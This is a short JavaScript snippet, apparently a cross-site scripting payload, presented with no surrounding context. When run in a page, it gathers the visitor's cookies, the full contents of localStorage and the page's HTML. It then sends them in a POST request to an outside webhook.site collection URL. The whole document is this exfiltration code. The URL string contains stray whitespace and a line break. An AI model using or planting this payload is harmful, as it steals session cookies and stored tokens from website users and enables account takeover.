(() => {
  const data = {
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    html: document.documentElement.outerHTML,
  };

  fetch("  https://webhook.site/4d0427f2-b174-4a86-a32a-61c76bd977d1
", {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data),
  });
})();
